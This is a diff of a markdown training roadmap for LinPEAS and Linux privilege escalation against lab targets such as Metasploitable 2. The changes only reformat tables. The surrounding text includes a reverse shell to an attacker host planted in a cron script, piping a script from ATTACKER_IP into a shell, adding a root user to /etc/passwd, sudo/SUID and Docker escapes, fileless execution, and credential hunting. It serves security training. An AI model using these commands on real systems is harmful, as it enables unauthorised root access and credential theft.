@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]] · [[Cyber-Security/Lab/Metasploitable_2/TASK_LIST|🐧 Metasploitable 2 Lab]] · [[Cyber-Security/Lab/OWASP_Broken_WebApps/TASK_LIST|🌐 OWASP BWA Lab]]
 
 | Recon & Scanning | Exploitation | Post-Exploitation | Web & Traffic |
-|:-----------------|:-------------|:-------------------|:--------------|
+| :----------------- | :------------- | :------------------- | :-------------- |
 | [[Nmap\|🗺️ Nmap]] | [[Metasploit_Framework\|💀 Metasploit]] | **🐉 LinPEAS** (you are here) | [[Burp_Suite\|🕷️ Burp Suite]] |
 | [[Netcat\|🔌 Netcat]] | [[Impacket\|🐍 Impacket]] | [[BloodHound\|🩸 BloodHound]] | [[Wireshark\|🦈 Wireshark]] |
-| | [[Hydra\|🔓 Hydra]] | [[Hashcat\|🔥 Hashcat]] | |
+|| [[Hydra\|🔓 Hydra]] | [[Hashcat\|🔥 Hashcat]] ||
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals & Linux Privesc Theory | 6 | 3–4 hours |
 | 2 | Core LinPEAS Sections | 8 | 5–7 hours |
 | 3 | Intermediate (Interpretation & Exploitation) | 5 | 4–6 hours |
@@ -40,7 +40,7 @@
 | 6 | Practical Labs | 4 | 6–10 hours |
 | 7 | Methodology & Limitations | 3 | 2–3 hours |
 | 8 | Mastery Challenges | 3 | 4–6 hours |
-| | **Total** | **38** | **~29–44 hours** |
+|| **Total** | **38** | **~29–44 hours** |
 
 **Prerequisites:** Linux command line proficiency. Initial shell access on a target. Understanding of Linux file permissions, SUID/SGID, cron, services, and user management. A vulnerable target (Metasploitable 2).
 
@@ -74,7 +74,7 @@ curl http://ATTACKER_IP:8000/linpeas.sh | sh  # on target
 
 ### Color Code Key
 | Color | Meaning |
-|-------|---------|
+| ------- | --------- |
 | RED/YELLOW | 95%+ privilege escalation vector |
 | RED | Highly interesting / likely exploitable |
 | YELLOW | Check manually |
@@ -82,7 +82,7 @@ curl http://ATTACKER_IP:8000/linpeas.sh | sh  # on target
 
 ### Key Flags
 | Flag | Meaning |
-|------|---------|
+| ------ | --------- |
 | `-a` | Fast mode (skips slow checks) |
 | `-q` | Quiet/no-color output |
 | `-s` | Stealth (slower, less noise) |
@@ -110,7 +110,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand why privilege escalation matters: you have a shell as `www-data` or a regular user, but you need `root` to fully control the system, access all data, install persistence, and pivot. |
 | **Skills Learned** | The gap between initial access and full compromise, why root matters (full filesystem access, service control, credential access, kernel-level control), the concept that privesc is finding a misconfiguration the sysadmin left behind. |
 | **Practical Exercise** | From a low-privilege shell: run `id`, `whoami`, `sudo -l`, `cat /etc/shadow` (should fail). Document what you CAN and CANNOT do as the current user. This gap is what privesc closes. |
@@ -124,7 +124,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Learn the systematic privesc methodology: (1) Situational awareness, (2) User/group enumeration, (3) Sudo permissions, (4) SUID/SGID binaries, (5) Cron jobs, (6) Writable files/directories, (7) Network services, (8) Credentials in files, (9) Kernel exploits. LinPEAS automates ALL of these checks. |
 | **Skills Learned** | The privesc checklist in priority order (easiest/safest first, riskiest last), understanding each vector, why systematic enumeration beats guessing. |
 | **Practical Exercise** | Write out the privesc methodology as a numbered checklist. For each vector, write one sentence explaining how it leads to root. This becomes your mental framework that LinPEAS output maps to. |
@@ -138,7 +138,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Get LinPEAS onto the target system using multiple transfer methods. You won't always have the same tools available — know multiple techniques. |
 | **Skills Learned** | File transfer techniques: `wget`, `curl`, Python HTTP server, Netcat transfer, base64 encoding, `scp`, hosting on attacker web server. |
 | **Transfer Methods** | **wget:** Attacker: `python3 -m http.server 8080`. Target: `wget http://<attacker>:8080/linpeas.sh`. **curl:** `curl http://<attacker>:8080/linpeas.sh -o /tmp/linpeas.sh`. **Netcat:** Attacker: `nc -lvnp 5555 < linpeas.sh`. Target: `nc <attacker> 5555 > /tmp/linpeas.sh`. **Base64:** Attacker: `base64 linpeas.sh`. Target: `echo "<base64>" | base64 -d > /tmp/linpeas.sh`. **No transfer:** `curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` (if target has internet — rare in pentests). |
@@ -152,7 +152,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand LinPEAS execution flags and options: full scan, specific checks, quiet mode, output saving, and network checks. |
 | **Syntax** | Full scan: `./linpeas.sh`. Save output: `./linpeas.sh | tee linpeas-output.txt`. Specific checks: `./linpeas.sh -s` (superfast — skip slow checks). No network checks: `./linpeas.sh -N`. No colors (for log files): `./linpeas.sh -a > output.txt`. Quiet (no banner): `./linpeas.sh -q`. |
 | **Expected Output** | Understanding of execution options. Saved output file for later analysis. |
@@ -165,7 +165,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand LinPEAS's color-coded severity system. Colors tell you where to focus your attention — don't read everything linearly, prioritize by color. |
 | **Color System** | 🔴 **RED/YELLOW on RED background:** 95% chance of privilege escalation — investigate immediately. 🟡 **RED:** Important misconfiguration — high probability of exploitation. 🟢 **YELLOW:** Interesting information — may lead to escalation with additional context. ⚪ **GREEN:** Normal/expected configuration — no issue. 🔵 **LIGHT CYAN:** Normal users info. 🔵 **BLUE:** Additional info — supplementary context. |
 | **Expected Output** | Ability to triage LinPEAS output by color. Understanding that red/yellow items deserve immediate investigation, while green items can usually be skipped. |
@@ -178,7 +178,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand that LinPEAS is an ENUMERATION tool, not an EXPLOITATION tool. It finds potential escalation vectors — YOU must verify and exploit them. Every LinPEAS finding should map to a manual command you can run. |
 | **Skills Learned** | The difference between enumeration and exploitation, why automated findings need manual verification (false positives), building manual command equivalents for each LinPEAS check. |
 | **Practical Exercise** | For each LinPEAS section, write the equivalent manual command: Sudo → `sudo -l`. SUID → `find / -perm -4000 2>/dev/null`. Cron → `cat /etc/crontab; ls -la /etc/cron.*`. Writable → `find / -writable 2>/dev/null`. |
@@ -196,7 +196,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Interpret LinPEAS's system information section: OS version, kernel version, architecture, hostname, and distribution details. This determines which kernel exploits and techniques are applicable. |
 | **Key Checks** | Kernel version → search for kernel exploits (`searchsploit linux kernel <version>`). OS distribution and version → known vulnerabilities for that distro. Architecture (x86 vs x64) → determines exploit/tool compatibility. |
 | **Manual Equivalent** | `uname -a`, `cat /etc/os-release`, `cat /proc/version`, `arch`. |
@@ -210,7 +210,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Analyze LinPEAS's sudo findings: what commands can the current user run with sudo? Are any exploitable via GTFOBins? Is the password known or not required (NOPASSWD)? |
 | **Key Findings** | `(ALL) NOPASSWD: ALL` → instant root: `sudo su`. `(ALL) NOPASSWD: /usr/bin/vim` → `sudo vim -c '!bash'`. `(root) /usr/bin/find` → `sudo find / -exec /bin/bash \;`. Any binary listed on GTFOBins with sudo capabilities. `env_keep+=LD_PRELOAD` → shared library injection. |
 | **Manual Equivalent** | `sudo -l` (the single most important privesc command). |
@@ -224,7 +224,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Analyze SUID binaries found by LinPEAS. SUID binaries run with the file OWNER's privileges (usually root) regardless of who executes them. Custom or vulnerable SUID binaries are a common escalation path. |
 | **Key Findings** | Standard SUID binaries (expected): `/bin/su`, `/bin/mount`, `/bin/ping`, `/usr/bin/passwd`. Suspicious SUID binaries: anything custom, anything writable, anything not in the standard list. Check each against GTFOBins. `nmap` with SUID → `nmap --interactive` → `!sh` (root shell). `find` with SUID → `find / -exec /bin/bash -p \;`. `python` with SUID → `python -c 'import os; os.setuid(0); os.system("/bin/bash")'`. |
 | **Manual Equivalent** | `find / -perm -4000 -type f 2>/dev/null` (SUID). `find / -perm -2000 -type f 2>/dev/null` (SGID). |
@@ -238,7 +238,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Analyze cron job findings: jobs running as root that execute writable scripts, jobs using wildcards that can be exploited, jobs with relative paths that can be hijacked. |
 | **Key Findings** | Root cron job executing a world-writable script → replace script content with reverse shell. Root cron job using wildcard (`*`) → inject malicious filenames (tar wildcard injection, etc.). Root cron job with relative path → PATH hijacking. |
 | **Manual Equivalent** | `cat /etc/crontab`, `ls -la /etc/cron.*`, `crontab -l`, `systemctl list-timers`. For hidden cron jobs: `pspy` (monitors processes without root). |
@@ -252,7 +252,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Identify writable files and directories that shouldn't be writable: `/etc/passwd` (add root user), `/etc/shadow` (change root password), service configuration files, scripts in root's PATH. |
 | **Key Findings** | Writable `/etc/passwd` → add a new root user: `echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd`. Writable `/etc/shadow` → change root's hash. Writable scripts in PATH → replace with malicious version. Writable service configs → modify to execute as root. |
 | **Manual Equivalent** | `find / -writable -type f 2>/dev/null | grep -v proc`. `ls -la /etc/passwd /etc/shadow`. |
@@ -266,7 +266,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Review LinPEAS's search for credentials in files: passwords in config files, SSH keys, database credentials, API tokens, history files, and environment variables. |
 | **Key Findings** | Passwords in `.bash_history` → reuse for `su root`. SSH private keys in home directories → login as other users. Database credentials in web application configs (wp-config.php, config.php) → database access → potentially root. AWS/cloud credentials → cloud account takeover. `.env` files with secrets → application compromise. |
 | **Manual Equivalent** | `find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null`. `find / -name "id_rsa" 2>/dev/null`. `cat ~/.bash_history | grep -i pass`. `env | grep -i pass`. |
@@ -280,7 +280,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Review internal network services that might not be visible from external scanning: services listening on localhost, internal-only databases, Docker sockets, and network interfaces. |
 | **Key Findings** | Services on 127.0.0.1 only → may have weaker authentication. Docker socket accessible (`/var/run/docker.sock`) → container escape to root. MySQL on localhost with root:no-password → database access. Multiple network interfaces → pivot opportunity. |
 | **Manual Equivalent** | `ss -tlnp`, `netstat -tlnp`, `ip addr`, `ls -la /var/run/docker.sock`. |
@@ -294,7 +294,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Analyze Linux capabilities assigned to binaries and check for container escape opportunities (Docker, LXC, Kubernetes). |
 | **Key Findings** | `cap_setuid` on Python/Perl → `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`. Container indicators: `.dockerenv` file, cgroup namespaces, limited `/proc`. Container escape: writable Docker socket, privileged container, mounted host filesystem. |
 | **Manual Equivalent** | `getcap -r / 2>/dev/null`, `cat /proc/1/cgroup`, `ls -la /.dockerenv`. |
@@ -312,7 +312,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Master GTFOBins — the comprehensive database of Unix binaries that can be exploited for privilege escalation via sudo, SUID, capabilities, or file operations. Every LinPEAS finding should be cross-referenced here. |
 | **Skills Learned** | GTFOBins navigation, understanding exploitation contexts (sudo, SUID, capabilities, limited SUID), applying GTFOBins techniques to LinPEAS findings, knowing the top 20 most commonly exploitable binaries. |
 | **Key Binaries** | `vim`, `find`, `python`, `perl`, `ruby`, `awk`, `nmap`, `less`, `more`, `man`, `ftp`, `socat`, `wget`, `curl`, `tar`, `zip`, `env`, `docker`, `bash`, `cp`. |
@@ -326,7 +326,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Practice exploiting common sudo misconfigurations found by LinPEAS: NOPASSWD entries, wildcard abuse, environment variable injection (LD_PRELOAD, LD_LIBRARY_PATH). |
 | **Practical Exercise** | LD_PRELOAD: Write a shared library that spawns a shell → `sudo LD_PRELOAD=/tmp/exploit.so <allowed-binary>`. Sudo with wildcards: if `sudo /usr/bin/find /var/log -name *.log`, create a file named `-exec /bin/bash ;`. |
 | **Expected Output** | Root shells obtained through at least three different sudo exploitation techniques. |
@@ -338,7 +338,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Practice exploiting SUID binaries: known GTFOBins binaries, custom SUID binaries (reverse engineering with `strings`), and shared library hijacking on SUID binaries. |
 | **Practical Exercise** | Find SUID binaries → check GTFOBins → exploit known techniques. For custom binaries: `strings <binary>` to find called commands → if relative paths used, create a PATH hijacking exploit. Shared library: `ldd <suid-binary>` → if a library path is writable or missing, create a malicious library. |
 | **Expected Output** | Root shells from SUID exploitation. Understanding of PATH hijacking and shared library attacks. |
@@ -350,7 +350,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Exploit writable cron scripts, wildcard injection, and PATH abuse in cron jobs to achieve root. |
 | **Practical Exercise** | Writable script: `echo 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /opt/backup.sh` (if cron runs it as root). Tar wildcard: In a directory where root runs `tar cf backup.tar *`, create: `echo "" > "--checkpoint=1"` and `echo "" > "--checkpoint-action=exec=bash reverse.sh"`. |
 | **Expected Output** | Root shell via cron job exploitation. Understanding of wildcard injection mechanics. |
@@ -362,7 +362,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | As a LAST RESORT, identify and execute kernel exploits. Use LinPEAS's kernel version findings with `linux-exploit-suggester` to find applicable exploits. |
 | **Skills Learned** | Kernel exploit risk assessment (may crash the system), `linux-exploit-suggester` usage, compiling kernel exploits on/for the target, known reliable kernel exploits (DirtyPipe, DirtyCow, PwnKit). |
 | **Practical Exercise** | `./linux-exploit-suggester.sh` → identify candidates → research each (is it reliable? does it crash the system?) → compile on attacker with matching architecture → transfer and execute. |
@@ -386,10 +386,10 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Execute LinPEAS without writing it to disk (fileless execution). This avoids detection by file integrity monitoring and some AV solutions. |
 | **Syntax** | From attacker HTTP server: `curl http://<attacker>:8080/linpeas.sh | bash`. From GitHub (if target has internet): `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash`. Piped through base64: encode on attacker → decode and execute on target. |
-| **Expected Output** | LinPEAS executed without a file on disk. Output captured via `| tee /dev/shm/output.txt` or redirected to attacker via Netcat. |
+| **Expected Output** | LinPEAS executed without a file on disk. Output captured via ` | tee /dev/shm/output.txt` or redirected to attacker via Netcat. |
 | **Common Mistakes** | Not capturing output when running fileless (output scrolls past and is lost). Not understanding that fileless still leaves process traces. `/dev/shm` is a tmpfs — files there are in memory only. |
 
 ---
@@ -399,7 +399,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Perform complete privilege escalation enumeration using only built-in commands when you can't transfer or execute LinPEAS (restricted shells, no write access, monitored environments). |
 | **Manual Commands** | `id; whoami` → `sudo -l` → `find / -perm -4000 2>/dev/null` → `cat /etc/crontab; ls -la /etc/cron.*` → `find / -writable -type f 2>/dev/null` → `getcap -r / 2>/dev/null` → `cat /etc/passwd` → `ls -la /home/` → `env` → `cat ~/.bash_history` → `ss -tlnp` → `uname -a` → `find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null`. |
 | **Expected Output** | Complete enumeration using only built-in commands. Results equivalent to LinPEAS but obtained manually. |
@@ -411,7 +411,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Read LinPEAS's source code to understand what each check does. This deepens your understanding of Linux security and helps you identify new escalation vectors that LinPEAS might miss. |
 | **Practical Exercise** | Read the LinPEAS shell script. Identify each section's checks. Understand the `grep` patterns used for credential searching. Note any checks you could add or improve. |
 | **Expected Output** | Understanding of LinPEAS internals. Ideas for additional manual checks not covered by LinPEAS. |
@@ -423,7 +423,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use pspy to monitor processes running on the system without root privileges. This reveals hidden cron jobs, background services, and commands that aren't visible through normal cron enumeration. |
 | **Syntax** | Transfer pspy to target → `./pspy64` (or `pspy32` for x86). Watch for recurring processes — especially those running as root (UID=0). |
 | **Expected Output** | Hidden scheduled tasks discovered. Root processes observed that may be exploitable. |
@@ -435,7 +435,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Exploit container misconfigurations identified by LinPEAS: writable Docker socket, privileged containers, mounted host filesystems, dangerous capabilities. |
 | **Key Techniques** | Docker socket: `docker run -v /:/host -it alpine chroot /host bash`. Privileged container: `mount /dev/sda1 /mnt && chroot /mnt bash`. Host PID namespace: access host processes. `cap_sys_admin` capability: mount host filesystem. |
 | **Expected Output** | Root access on the HOST system from within a container. |
@@ -569,7 +569,7 @@ Based on hundreds of Linux targets, these account for ~90% of privilege escalati
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can transfer and execute LinPEAS on any target | ☐ |
 | Can interpret color-coded output and prioritize findings | ☐ |
 | Can exploit sudo, SUID, cron, and writable file findings | ☐ |
